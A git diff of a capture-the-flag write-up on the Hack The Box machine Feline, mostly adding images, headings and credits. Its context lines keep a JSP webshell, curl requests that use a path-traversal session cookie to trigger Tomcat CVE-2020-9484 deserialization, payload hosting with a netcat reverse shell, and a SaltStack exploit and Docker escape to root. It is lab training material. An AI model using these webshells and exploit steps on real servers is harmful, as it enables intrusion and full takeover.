@@ -1,8 +1,14 @@
+---
+description: >-
+  Zweilosec's writeup on the hard-difficulty Linux machine Feline from
+  https://hackthebox.eu
+---
+
 # HTB - Feline
 
 ## Overview
 
-![](https://github.com/zweilosec/htb-writeups/tree/d09358b30b8a0d1cf35bd0283860b77c2fbe3623/linux-machines/hard/machine%3E.infocard.png)
+![](../../.gitbook/assets/0-feline-infocard.png)
 
 Short description to include any strange things to be dealt with - Hard Linux
 
@@ -82,15 +88,15 @@ Nmap done: 1 IP address (1 host up) scanned in 29.91 seconds
 
 only two ports open, 22- SSH and 8080 - HTTP
 
-pic
+![](../../.gitbook/assets/1-virusbucket.png)
 
 HTTP had a website, VirusBucket for uploading and testing files for malware.
 
-pic
+![](../../.gitbook/assets/2-virusbucket-fail-burp.png)
 
 Uploaded php shell, but got `File Upload Error`
 
-pic
+![](../../.gitbook/assets/2-virusbucket-fail.png)
 
 ```java
 <%@ page import="java.util.*,java.io.*"%>
@@ -128,11 +134,21 @@ if (request.getParameter("cmd") != null) {
 </BODY></HTML>
 ```
 
-next tried uploading a `cmd.jsp` simple webshell from [https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/jsp/cmd.jsp](https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/jsp/cmd.jsp) and got a success message
+next tried uploading a `cmd.jsp` simple webshell from [https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/jsp/cmd.jsp](https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/jsp/cmd.jsp) 
+
+![](../../.gitbook/assets/2-virusbucket-success.png)
+
+and got a success message
+
+![](../../.gitbook/assets/2-virusbucket-success-burp.png)
 
 renaming the files uploaded fixed the invalid filename error, filenames cannot have `-` or `_` in them...
 
+### CVE-2020-9484
+
 Googling the version of apache `Apache Tomcat 9.0.27` and file upload leads to pages that give instructions for deploying a web app through a `.war` file
+
+![](../../.gitbook/assets/2-virusbucket-burp-pngerror.png)
 
 ```text
 <div id="error">
@@ -185,19 +201,21 @@ Caused by: java.io.FileNotFoundException: /opt/tomcat/temp/upload_d4070743_9738_
 
 Uploading a PNG file made it spit out a very verbose error message. I could see in the output the location the files were being uploaded to: `/opt/tomcat/temp/upload_d4070743_9738_4ba0_94f9_f5544ed1c26d_00000027.tmp`. This gave me a chance to try to execute code if directory traversal was not blocked
 
-according to [https://tomcat.apache.org/tomcat-9.0-doc/changelog.html](https://tomcat.apache.org/tomcat-9.0-doc/changelog.html) 9.0.41 is the newest version, so perhaps 9.0.27 has vulnerabilities
+according to [https://tomcat.apache.org/tomcat-9.0-doc/changelog.html](https://tomcat.apache.org/tomcat-9.0-doc/changelog.html) 9.0.41 is the newest version, so I thought that perhaps 9.0.27 had vulnerabilities.
 
-[https://tomcat.apache.org/security-9.html\#Fixed\_in\_Apache\_Tomcat\_9.0.29](https://tomcat.apache.org/security-9.html#Fixed_in_Apache_Tomcat_9.0.29)
+* [https://tomcat.apache.org/security-9.html\#Fixed\_in\_Apache\_Tomcat\_9.0.29](https://tomcat.apache.org/security-9.html#Fixed_in_Apache_Tomcat_9.0.29)
 
-[https://www.redtimmy.com/apache-tomcat-rce-by-deserialization-cve-2020-9484-write-up-and-exploit/](https://www.redtimmy.com/apache-tomcat-rce-by-deserialization-cve-2020-9484-write-up-and-exploit/)
+![](../../.gitbook/assets/3-cve1.png)
 
-[https://packetstormsecurity.com/files/157924/Apache-Tomcat-CVE-2020-9484-Proof-Of-Concept.html](https://packetstormsecurity.com/files/157924/Apache-Tomcat-CVE-2020-9484-Proof-Of-Concept.html)
+Found a vulnerability that had been fixed in version 9.0.35 that sounded very useful for getting remote code execution, which was given CVE number CVE-2020-9484.
+
+* [https://www.redtimmy.com/apache-tomcat-rce-by-deserialization-cve-2020-9484-write-up-and-exploit/](https://www.redtimmy.com/apache-tomcat-rce-by-deserialization-cve-2020-9484-write-up-and-exploit/)
+* [https://packetstormsecurity.com/files/157924/Apache-Tomcat-CVE-2020-9484-Proof-Of-Concept.html](https://packetstormsecurity.com/files/157924/Apache-Tomcat-CVE-2020-9484-Proof-Of-Concept.html)
 
 > Apache Tomcat is affected by a Java deserialization vulnerability if the PersistentManager is configured as session manager. Successful exploitation requires the attacker to be able to upload an arbitrary file to the server.
 
-[https://medium.com/@romnenko/apache-tomcat-deserialization-of-untrusted-data-rce-cve-2020-9484-afc9a12492c4](https://medium.com/@romnenko/apache-tomcat-deserialization-of-untrusted-data-rce-cve-2020-9484-afc9a12492c4)
-
-[https://github.com/frohoff/ysoserial](https://github.com/frohoff/ysoserial)
+* [https://medium.com/@romnenko/apache-tomcat-deserialization-of-untrusted-data-rce-cve-2020-9484-afc9a12492c4](https://medium.com/@romnenko/apache-tomcat-deserialization-of-untrusted-data-rce-cve-2020-9484-afc9a12492c4)
+* [https://github.com/frohoff/ysoserial](https://github.com/frohoff/ysoserial)
 
 ```text
 #!/bin/bash
@@ -244,7 +262,7 @@ curl http://10.10.10.205:8080/upload.jsp -H 'Cookie:JSESSIONID=../../../opt/samp
 curl http://10.10.10.205:8080/upload.jsp -H 'Cookie:JSESSIONID=../../../opt/samples/uploads/executePayload'
 ```
 
-Finally I wrote a script to automate uploading all of these files to the server. Next I ran a python3 http.server so that the final payload could be downloaded, started a netcat listener, and then I ran the script and hoped that everything would work!
+Finally I wrote a script to automate uploading all of these files to the server. Next I ran `python3 -m http.server` so that the final payload could be downloaded, started a netcat listener, and then I ran the script and hoped that everything would work!
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/feline]
@@ -276,8 +294,6 @@ Each of the files were uploaded successfully, though they each threw a `HTTP Sta
 
 ## Initial Foothold
 
-## Road to User
-
 ```text
 ┌──(zweilos㉿kali)-[~/htb/feline]
 └─$ python3 -m http.server 9990
@@ -308,7 +324,7 @@ tomcat@VirusBucket:/opt/tomcat$ export TERM=xterm-256color
 
 I started logging output with the `script` command, started a bash shell \(since zsh seems to have problems with `stty raw -echo`\), then started my netcat listener. After running my `exploit.sh` I got a shell!
 
-### Further enumeration
+### Enumeration as `tomcat`
 
 ```text
 Active Internet connections (servers and established)                                                   
@@ -389,7 +405,7 @@ The user `tomcat` ended up being the user with the `user.txt` flag!
 
 ## Path to Power \(Gaining Administrator Access\)
 
-### Enumeration as `tomcat`
+### Further enumeration as `tomcat`
 
 ```text
 tomcat@VirusBucket:~$ cat /etc/passwd
@@ -467,33 +483,33 @@ Connection: close
 
 This socket did not seem to be vulnerable to this kind of injection
 
+### CVE-2020-16846
+
 Next I looked closer at the ports that were open internally. `SaltStack` uses ports 4505 and 4506 for its Salt master
 
-[https://docs.saltstack.com/en/getstarted/system/communication.html\#:~:text=The Salt master uses ports 4505 and 4506%2C,which must be opened to accept incoming connections](https://docs.saltstack.com/en/getstarted/system/communication.html#:~:text=The%20Salt%20master%20uses%20ports%204505%20and%204506%2C,which%20must%20be%20opened%20to%20accept%20incoming%20connections).
+* [https://docs.saltstack.com/en/getstarted/system/communication.html](https://docs.saltstack.com/en/getstarted/system/communication.html#:~:text=The%20Salt%20master%20uses%20ports%204505%20and%204506%2C,which%20must%20be%20opened%20to%20accept%20incoming%20connections)
 
 > Publisher \(port 4505\) All Salt minions establish a persistent connection to the publisher port where they listen for messages. Commands are sent asynchronously to all connections over this port, which enables commands to be executed over large numbers of systems simultaniously.
 >
 > Request Server \(port 4506\) Salt minions connect to the request server as needed to send results to the Salt master, and to securely request files and minion-specific data values \(called Salt pillar\). Connections to this port are 1:1 between the Salt master and Salt minion \(not asynchronous\).
 
-I did not see a salt user so it was possible that this might be runnng as `root`
+I did not see a salt user so it was possible that this might be running as `root`
 
-[https://us-cert.cisa.gov/ncas/current-activity/2020/05/01/saltstack-patches-critical-vulnerabilities-salt](https://us-cert.cisa.gov/ncas/current-activity/2020/05/01/saltstack-patches-critical-vulnerabilities-salt)
-
-[https://www.saltstack.com/blog/on-november-3-2020-saltstack-publicly-disclosed-three-new-cves/](https://www.saltstack.com/blog/on-november-3-2020-saltstack-publicly-disclosed-three-new-cves/)
+* [https://us-cert.cisa.gov/ncas/current-activity/2020/05/01/saltstack-patches-critical-vulnerabilities-salt](https://us-cert.cisa.gov/ncas/current-activity/2020/05/01/saltstack-patches-critical-vulnerabilities-salt)
+* [https://www.saltstack.com/blog/on-november-3-2020-saltstack-publicly-disclosed-three-new-cves/](https://www.saltstack.com/blog/on-november-3-2020-saltstack-publicly-disclosed-three-new-cves/)
 
 > CVE-2020-16846:
 >
 > Impact: This CVE affects any users running the Salt API. An unauthenticated user with network access to the Salt API can use shell injections to run code on the Salt-API using the SSH client.
 
-[https://blog.rapid7.com/2020/11/10/saltstack-pre-authenticated-remote-root-cve-2020-16846-and-cve-2020-25592-what-you-need-to-know/](https://blog.rapid7.com/2020/11/10/saltstack-pre-authenticated-remote-root-cve-2020-16846-and-cve-2020-25592-what-you-need-to-know/)
-
-[https://attackerkb.com/topics/FrF3udya6o/cve-2020-16846-saltstack-unauthenticated-shell-injection](https://attackerkb.com/topics/FrF3udya6o/cve-2020-16846-saltstack-unauthenticated-shell-injection)
+* [https://blog.rapid7.com/2020/11/10/saltstack-pre-authenticated-remote-root-cve-2020-16846-and-cve-2020-25592-what-you-need-to-know/](https://blog.rapid7.com/2020/11/10/saltstack-pre-authenticated-remote-root-cve-2020-16846-and-cve-2020-25592-what-you-need-to-know/)
+* [https://attackerkb.com/topics/FrF3udya6o/cve-2020-16846-saltstack-unauthenticated-shell-injection](https://attackerkb.com/topics/FrF3udya6o/cve-2020-16846-saltstack-unauthenticated-shell-injection)
 
 links to metasploit module: [https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/http/saltstack\_salt\_api\_cmd\_exec.rb](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/http/saltstack_salt_api_cmd_exec.rb)
 
 This module would require the port to be open from the outside, so I decided to make an SSH tunnel to give it a target to connect to. Unfortunately, `tomcat`'s user folder was owned by root so I could not create a `.ssh` folder to inject my key. Instead, I uploaded chisel and made a tunnel with that.
 
-[https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html](https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html)
+* [https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html](https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html)
 
 ### Getting a shell
 
@@ -710,7 +726,7 @@ sshd:*:18385:0:99999:7:::
 
 from the command history I could see that root had set a password, so I copied the hash to my computer and tried to crack it...unsuccessfully
 
-[https://docs.docker.com/engine/reference/commandline/exec/](https://docs.docker.com/engine/reference/commandline/exec/)
+* [https://docs.docker.com/engine/reference/commandline/exec/](https://docs.docker.com/engine/reference/commandline/exec/)
 
 ```text
 root@2d24bf61767c:~# docker ps
@@ -722,11 +738,9 @@ the docker command was not installed in the container, but since it was in the h
 
 [https://docs.docker.com/storage/bind-mounts/](https://docs.docker.com/storage/bind-mounts/) using this I could mount the `/root` directory of the host machine to the container and then copy my ssh key over to enable login
 
-[https://docs.docker.com/engine/reference/commandline/run/](https://docs.docker.com/engine/reference/commandline/run/)
-
-[https://docs.docker.com/engine/reference/commandline/images/](https://docs.docker.com/engine/reference/commandline/images/)
-
-[https://stackoverflow.com/questions/23439126/how-to-mount-a-host-directory-in-a-docker-container](https://stackoverflow.com/questions/23439126/how-to-mount-a-host-directory-in-a-docker-container)
+* [https://docs.docker.com/engine/reference/commandline/run/](https://docs.docker.com/engine/reference/commandline/run/)
+* [https://docs.docker.com/engine/reference/commandline/images/](https://docs.docker.com/engine/reference/commandline/images/)
+* [https://stackoverflow.com/questions/23439126/how-to-mount-a-host-directory-in-a-docker-container](https://stackoverflow.com/questions/23439126/how-to-mount-a-host-directory-in-a-docker-container)
 
 ```text
 root@2d24bf61767c:~# docker ps
@@ -864,7 +878,11 @@ root@VirusBucket:~# cat root.txt
 cadbc87f7fbe8bff317c9db5063c9e63
 ```
 
-Thanks to [`<box_creator>`](https://www.hackthebox.eu/home/users/profile/<profile_num>) for... \[something interesting or useful about this machine.\]
+I was in, and got my root proof!
+
+![](../../.gitbook/assets/0-feline-pwned.png)
+
+Thanks to [MinatoTW](https://www.hackthebox.eu/home/users/profile/8308) & [MrR3boot](https://www.hackthebox.eu/home/users/profile/13531) for... \[something interesting or useful about this machine.\]
 
 If you like this content and would like to see more, please consider [buying me a coffee](https://www.buymeacoffee.com/zweilosec)!
 
